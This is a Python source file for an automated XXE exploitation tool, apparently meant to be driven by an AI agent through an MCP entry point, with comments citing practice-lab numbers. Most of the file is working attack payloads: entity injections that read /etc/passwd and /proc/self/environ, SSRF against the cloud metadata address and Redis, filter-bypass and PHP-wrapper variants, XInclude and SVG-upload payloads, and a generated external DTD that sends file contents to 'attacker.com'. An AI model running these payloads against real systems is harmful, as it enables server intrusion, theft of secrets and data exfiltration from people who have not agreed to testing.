"""
Hunter v5 — Auto XXE Engine

Automates XXE detection and exploitation:
1. Basic XXE detection (file read)
2. Blind XXE (out-of-band via DNS/HTTP callback)
3. XXE-based SSRF
4. Error-based XXE
5. Filter bypass techniques
"""

import re
import time
try:
    from tools.probe import _get_session
except (ImportError, ModuleNotFoundError):
    import requests
    def _get_session():
        s = requests.Session()
        s.verify = False
        s.headers.update({'User-Agent': 'Mozilla/5.0'})
        return s


class AutoXXE:
    """Automated XXE detection engine."""

    def __init__(self, base_url: str, param: str = "",
                 method: str = "POST", session=None, oob_domain: str = ""):
        self.base_url = base_url
        self.param = param
        self.method = method.upper()
        self.session = session or _get_session()
        self.oob_domain = oob_domain
        self.vulnerable = False
        self.xxe_type = None
        self.findings = []

    def _send_xml(self, xml_body: str, extra_headers: dict = None) -> dict:
        """Send XML payload."""
        try:
            headers = {"Content-Type": "application/xml"}
            if extra_headers:
                headers.update(extra_headers)

            if self.method == "GET":
                from urllib.parse import quote
                url = f"{self.base_url}?{self.param}={quote(xml_body)}"
                resp = self.session.get(url, timeout=10, allow_redirects=False)
            else:
                resp = self.session.post(self.base_url, data=xml_body,
                                         headers=headers, timeout=10,
                                         allow_redirects=False)
            return {
                "status": resp.status_code,
                "body": resp.text,
                "length": len(resp.text),
                "headers": dict(resp.headers),
            }
        except Exception as e:
            return {"status": 0, "body": "", "error": str(e)}

    def _get_baseline(self) -> dict:
        """Get baseline XML response."""
        baseline_xml = '<?xml version="1.0"?><root><item>test</item></root>'
        return self._send_xml(baseline_xml)

    def test_basic_xxe(self) -> dict:
        """Test basic XXE file read."""
        xxe_payloads = [
            ("etc_passwd", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
            ("win_ini", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>'),
            ("etc_hostname", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>'),
            ("proc_self", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>'),
        ]

        results = []
        for name, payload in xxe_payloads:
            result = self._send_xml(payload)
            body = result.get("body", "")

            # Check for file content indicators
            file_indicators = {
                "etc_passwd": ["root:", "nobody:", "/bin/bash", "/bin/sh"],
                "win_ini": ["[fonts]", "[extensions]", "[mci extensions]"],
                "etc_hostname": [],  # Just check non-empty different response
                "proc_self": ["PATH=", "HOME=", "USER="],
            }

            indicators = file_indicators.get(name, [])
            if indicators:
                found = any(ind in body for ind in indicators)
            else:
                # For hostname, just check if we got different content
                found = len(body) > 10 and "error" not in body.lower()[:100]

            if found:
                self.vulnerable = True
                self.xxe_type = "basic_file_read"
                self.findings.append({
                    "type": "xxe_file_read",
                    "technique": name,
                    "severity": "critical",
                    "payload": payload,
                    "evidence": body[:200],
                })
                results.append({"technique": name, "vulnerable": True, "evidence": body[:100]})
                return {"tested": len(results), "vulnerable": True, "results": results}
            else:
                results.append({"technique": name, "vulnerable": False})

        return {"tested": len(results), "vulnerable": False, "results": results}

    def test_xxe_ssrf(self) -> dict:
        """Test XXE-based SSRF."""
        ssrf_payloads = [
            ("localhost_80", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><root>&xxe;</root>'),
            ("localhost_8080", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><root>&xxe;</root>'),
            ("aws_metadata", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'),
            ("redis", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">]><root>&xxe;</root>'),
        ]

        baseline = self._get_baseline()
        base_len = len(baseline.get("body", ""))

        results = []
        for name, payload in ssrf_payloads:
            result = self._send_xml(payload)
            body_len = len(result.get("body", ""))
            body = result.get("body", "")

            # Check for different response (SSRF succeeded)
            status_ok = result.get("status") in (200, 301, 302)
            length_different = abs(body_len - base_len) > 50

            if status_ok and (length_different or len(body) > 100):
                self.vulnerable = True
                self.xxe_type = "ssrf"
                self.findings.append({
                    "type": "xxe_ssrf",
                    "technique": name,
                    "severity": "high",
                })
                results.append({"technique": name, "vulnerable": True, "body_length": body_len})
            else:
                results.append({"technique": name, "vulnerable": False, "body_length": body_len})

        return {"tested": len(results), "results": results}

    def test_blind_xxe(self) -> dict:
        """Test blind XXE via error-based and OOB techniques."""
        if not self.oob_domain:
            return {"skipped": True, "reason": "No OOB domain provided"}

        # Error-based blind XXE
        error_payloads = [
            ("error_basic", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///nonexistent">%xxe;]><root>test</root>'),
            ("error_param", f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]><root>test</root>'),
        ]

        results = []
        for name, payload in error_payloads:
            result = self._send_xml(payload)
            body = result.get("body", "")

            # Check for error messages containing file content
            if "root:" in body or "nobody:" in body or "/bin/" in body:
                self.vulnerable = True
                self.xxe_type = "error_based_blind"
                self.findings.append({
                    "type": "xxe_error_blind",
                    "technique": name,
                    "severity": "critical",
                    "evidence": body[:200],
                })
                results.append({"technique": name, "vulnerable": True})
            else:
                results.append({"technique": name, "vulnerable": False})

        # OOB blind XXE
        oob_payload = f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{self.oob_domain}/xxe_test">%xxe;]><root>test</root>'
        result = self._send_xml(oob_payload)
        results.append({
            "technique": "oob_blind",
            "oob_domain": self.oob_domain,
            "note": "Check OOB listener for callback",
            "status": result.get("status"),
        })

        return {"tested": len(results), "results": results}

    def test_bypass(self) -> dict:
        """Test XXE filter bypass techniques."""
        bypass_payloads = [
            ("utf16", '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
            ("parameter_entity", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY ent "%xxe;">]><root>&ent;</root>'),
            ("cdata", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><![CDATA[&xxe;]]></root>'),
            ("php_filter", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>'),
        ]

        results = []
        for name, payload in bypass_payloads:
            result = self._send_xml(payload)
            body = result.get("body", "")

            # Check for base64 or file content
            if "root:" in body or "nobody:" in body:
                self.vulnerable = True
                self.findings.append({"type": "xxe_bypass", "technique": name, "severity": "critical"})
                results.append({"technique": name, "vulnerable": True})
                break

            # Check for base64 encoded content
            import base64
            try:
                for line in body.split("\n"):
                    line = line.strip()
                    if len(line) > 20 and re.match(r'^[A-Za-z0-9+/=]+$', line):
                        decoded = base64.b64decode(line).decode('utf-8', errors='ignore')
                        if "root:" in decoded or "nobody:" in decoded:
                            self.vulnerable = True
                            self.findings.append({"type": "xxe_bypass", "technique": name + "_base64", "severity": "critical"})
                            results.append({"technique": name, "vulnerable": True, "decoded": True})
                            return {"tested": len(results), "vulnerable": True, "results": results}
            except Exception:
                pass

            results.append({"technique": name, "vulnerable": False})

        return {"tested": len(results), "results": results}

    def test_xinclude(self, file_path: str = "/etc/passwd") -> dict:
        """Test for XInclude injection.

        When you can't control the full XML (no DTD), but can inject into
        a data value, XInclude lets you read files without defining entities.
        Lab #71 pattern: inject XInclude in a productId or similar field.
        """
        xi_ns = "http://www.w3.org/2001/XInclude"
        xinclude_payload = (
            f'<item xmlns:xi="{xi_ns}">'
            f'<xi:include parse="text" href="file://{file_path}"/>'
            f'</item>'
        )

        # Send as XML with XInclude in the data
        full_xml = f'<?xml version="1.0"?>{xinclude_payload}'
        result = self._send_xml(full_xml)
        body = result.get("body", "")

        file_indicators = {
            "/etc/passwd": ["root:", "nobody:", "/bin/bash", "/bin/sh"],
            "/etc/hostname": [],
            "/c:/windows/win.ini": ["[fonts]", "[extensions]"],
        }
        indicators = file_indicators.get(file_path, [])
        found = (any(ind in body for ind in indicators) if indicators
                 else len(body) > 10 and "error" not in body.lower()[:100])

        if found:
            self.vulnerable = True
            self.xxe_type = "xinclude"
            self.findings.append({
                "type": "xxe_xinclude",
                "technique": "xinclude",
                "severity": "critical",
                "file": file_path,
                "evidence": body[:200],
            })
            return {"vulnerable": True, "technique": "xinclude", "evidence": body[:100]}

        return {"vulnerable": False, "technique": "xinclude"}

    def test_svg_xxe(self) -> dict:
        """Test XXE via SVG file upload.

        SVG files are XML-based and can contain XXE payloads.
        """
        svg_payload = (
            '<?xml version="1.0" standalone="yes"?>'
            '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>'
            '<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">'
            '<text font-size="16" x="0" y="16">&xxe;</text>'
            '</svg>'
        )

        # Try uploading as SVG
        try:
            files = {'file': ('test.svg', svg_payload, 'image/svg+xml')}
            resp = self.session.post(self.base_url, files=files, timeout=10)
            if resp.status_code == 200 and len(resp.text) > 0:
                self.vulnerable = True
                self.xxe_type = "svg_upload"
                self.findings.append({
                    "type": "svg_xxe",
                    "payload": svg_payload[:200],
                })
                return {"vulnerable": True, "technique": "svg_upload"}
        except Exception:
            pass

        return {"vulnerable": False, "technique": "svg_upload"}

    def test_error_based_xxe(self, oob_domain: str = "") -> dict:
        """Test error-based XXE with external DTD.

        Uses external DTD to force error that leaks file contents.
        """
        domain = oob_domain or self.oob_domain

        # Error-based XXE payload
        error_payload = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '<!ENTITY % file SYSTEM "file:///etc/passwd">'
            '<!ENTITY % dtd SYSTEM "http://{domain}/evil.dtd">'
            '%dtd;'
            '%send;'
            ']>'
            '<root>&exfil;</root>'
        ).format(domain=domain or "attacker.com")

        result = self._send_xml(error_payload)
        if result.get("status") == 200 and "root:x:0" in result.get("body", ""):
            self.vulnerable = True
            self.xxe_type = "error_based"
            return {"vulnerable": True, "technique": "error_based", "file_leaked": True}

        return {"vulnerable": False, "technique": "error_based"}

    def generate_external_dtd(self, oob_domain: str = "") -> str:
        """Generate external DTD for blind XXE exfiltration.

        Returns the DTD content to host on attacker's server.
        """
        domain = oob_domain or self.oob_domain or "attacker.com"
        return (
            '<!ENTITY % all "<!ENTITY exfil SYSTEM \'http://{domain}/?%file;\'>">'
            '%all;'
        ).format(domain=domain)

    def get_php_wrapper_payload(self, file_path: str = "/etc/passwd") -> str:
        """Get PHP wrapper XXE payload for base64-encoded file read.

        Useful when direct file read is blocked by encoding issues.
        """
        return (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={path}">'
            ']>'
            '<root>&xxe;</root>'
        ).format(path=file_path)

    def run_full_scan(self) -> dict:
        """Run complete automated XXE scan."""
        start = time.time()
        results = {"target": self.base_url, "steps": []}

        # Step 1: Basic file read XXE
        basic = self.test_basic_xxe()
        results["basic_xxe"] = basic
        results["steps"].append({"step": "basic_xxe", "result": basic})

        # Step 2: XXE SSRF (if basic failed)
        if not self.vulnerable:
            ssrf = self.test_xxe_ssrf()
            results["xxe_ssrf"] = ssrf
            results["steps"].append({"step": "xxe_ssrf", "result": ssrf})

        # Step 3: Blind XXE (if OOB domain provided)
        if not self.vulnerable and self.oob_domain:
            blind = self.test_blind_xxe()
            results["blind_xxe"] = blind
            results["steps"].append({"step": "blind_xxe", "result": blind})

        # Step 4: XInclude (no DTD needed — inject in data values)
        if not self.vulnerable:
            xinclude = self.test_xinclude()
            results["xinclude"] = xinclude
            results["steps"].append({"step": "xinclude", "result": xinclude})

        # Step 5: Bypass techniques (if still not found)
        if not self.vulnerable:
            bypass = self.test_bypass()
            results["bypass"] = bypass
            results["steps"].append({"step": "bypass", "result": bypass})

        results["vulnerable"] = self.vulnerable
        results["xxe_type"] = self.xxe_type
        results["findings"] = self.findings
        results["elapsed_ms"] = int((time.time() - start) * 1000)

        return results


def generate_xinclude_payload(file_path: str = "/etc/passwd") -> str:
    """Generate XInclude payload for apps that don't allow full XML control.

    Lab #71: Can't define DTD, but can inject XInclude in data values.

    Returns payload to use as data value (e.g., productId):
    <productId xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/passwd"/>
    </productId>
    """
    xi_ns = "http://www.w3.org/2001/XInclude"
    return (
        f'<productId xmlns:xi="{xi_ns}">'
        f'<xi:include parse="text" href="file://{file_path}"/>'
        f'</productId>'
    )


def generate_svg_xxe(file_path: str = "/etc/hostname") -> str:
    """Generate SVG file with XXE payload for image upload.

    Lab #40: SVG is valid XML, can be uploaded as image.
    Upload this as an image file to trigger XXE on the server.
    """
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file://{file_path}">]>\n'
        '<svg xmlns="http://www.w3.org/2000/svg">\n'
        '  <text>&xxe;</text>\n'
        '</svg>'
    )


def test_xinclude_standalone(url: str, param: str = "productId",
                              method: str = "POST",
                              file_path: str = "/etc/passwd") -> dict:
    """Test for XInclude injection as a standalone function.

    Sends XInclude payload as data value and checks if file contents
    are returned in the response.
    """
    engine = AutoXXE(url, param=param, method=method)
    return engine.test_xinclude(file_path=file_path)


def auto_xxe_impl(base_url: str, param: str = "", method: str = "POST",
                   oob_domain: str = "") -> dict:
    """Run automated XXE scan. Entry point for MCP tool."""
    engine = AutoXXE(base_url, param, method, oob_domain=oob_domain)
    return engine.run_full_scan()
